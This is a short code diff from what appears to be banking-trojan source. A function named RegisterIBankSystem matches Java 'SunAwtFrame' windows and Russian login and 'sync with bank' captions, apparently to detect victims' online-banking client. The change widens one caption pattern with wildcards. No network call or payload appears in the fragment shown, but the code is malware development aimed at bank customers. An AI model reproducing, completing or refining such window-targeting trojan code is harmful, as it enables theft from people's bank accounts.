@@ -660,7 +660,7 @@ void RegisterIBankSystem(DWORD hashApp)
 	char ClassName[] = {'S','u','n','A','w','t','F','r','a','m','e', 0};;
 	char Caption1[]  = {'*', 'в', 'х', 'о', 'д', '*',  0};;
 	char Caption2[]  = {'*', 'в', 'х', '*', 'д', '*',  0};
-	char Caption3[]  = {'*','и','н','х','р','о','н','и','з','а','ц','и','я','*', 0}; //Синхронизация с банком
+	char Caption3[]  = {'*','и','н','х','р','о','н','*','з','а','ц','*','я','*', 0}; //Синхронизация с банком
 
 
 	DWORD hashMain = PROCESS_HASH_JAVA;
